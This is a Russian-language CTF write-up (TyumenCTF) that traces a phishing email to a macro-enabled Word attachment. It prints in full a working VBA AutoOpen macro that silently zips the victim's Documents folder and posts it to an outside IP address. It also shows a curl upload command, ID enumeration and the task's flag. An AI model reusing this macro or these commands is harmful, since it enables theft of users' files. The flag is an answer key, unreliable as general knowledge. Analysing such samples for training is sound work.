# 272+273=8

Простая математика. Кстати, о математике... У меня украли мою любимую папку с домашкой. Узнаешь, что в ней было? Только тс-с-с...

## Решение

Внутри архива находится профиль почтового клиента Thunderbird. Если загрузить его в программу (меню Инструменты -> Импорт), можно увидеть список входящих писем некоего Ивана Табуретки.

Среди недавних писем можно найти письмо с адреса `noreply@vorgaming.com`, содержащее сообщение об ограничении доступа к аккаунту и просьбу открыть прилагаемый документ.

К письму прикреплен файл `kek.docm`, представляющий из себя документ Microsoft Word с поддержкой макросов. При открытии его MS Word показывается предупреждении о наличии небезопасных макросов.

Открыв для редактирования проект макросов, можно найти исходный код макроса:

```
Sub AutoOpen()
    archivePath = Environ("TEMP") & "\docs.zip"

    CompressFiles (archivePath)
    UploadFile (archivePath)
End Sub

Sub CompressFiles(archivePath As String)
    Dim fso As Object, homePath As String

    homePath = Environ("USERPROFILE") & "\Documents"

    Call Shell("powershell.exe -WindowStyle Hidden Compress-Archive -Force -Path """ & homePath & "\*"" -DestinationPath """ & archivePath & """", vbNormalFocus)
End Sub

Sub UploadFile(filePath As String)
    Dim fso As Object, serverURL As String

    Set fso = CreateObject("Scripting.FileSystemObject")

    serverURL = "http://5.1.53.43:5019/upload/" & fso.GetFileName(filePath)

    Dim oXMLHTTP As Object, bByte() As Byte

    Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")

    If Not fso.FileExists(filePath) Then
        MsgBox "File not found at: " & filePath, vbCritical
        Exit Sub
    End If

    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    With stream
        .Type = 1
        .Open
        .LoadFromFile filePath
        bByte = .Read
        .Close
    End With

    oXMLHTTP.Open "POST", serverURL, False
    oXMLHTTP.setRequestHeader "Content-Type", "application/octet-stream"
    oXMLHTTP.Send (bByte)

    Set fso = Nothing
End Sub
```

По этому коду видно, что макрос создает архив папки `Документы`, сохраняет его в %TEMP%/docs.zip и загружает на удаленный сервер POST запросом по адресу `http://5.1.53.43:5019/upload/docs.zip`.

Если попытаться загрузить собственный файл на сервер, например, командой curl:

```
curl -X POST http://5.1.53.43:5019/upload/docs.zip --data-binary @docs.zip
```

Сервер вернет ответ вида:

```
<body>File uploaded successfuly!<a href="/files/docs-100504.zip">View</a></body>
```

Из этого ответа можно понять, что сервер сохраняет файлы, добавив к имени из пути числовой идентификатор. Значит, зная имя загруженного файла, можно найти ссылку на него перебором идентификаторов в сторону убывания.

После нескольких попыток узнаем, что загруженный макросом файл имеет адрес `http://5.1.53.43:5019/files/docs-1005000.zip`. Его нужно скачать и разархивировать.

Командой `grep -rn TyumenCTF` или ручным поиском можно выяснить, что флаг находится в файле `Домашка/Английский язык/не открывать!!!/passwords.txt`

## Флаг
```
TyumenCTF{h0m3wrk_f01dr_1s_4lway5_fu1l_0f_s3cr3ts}
```
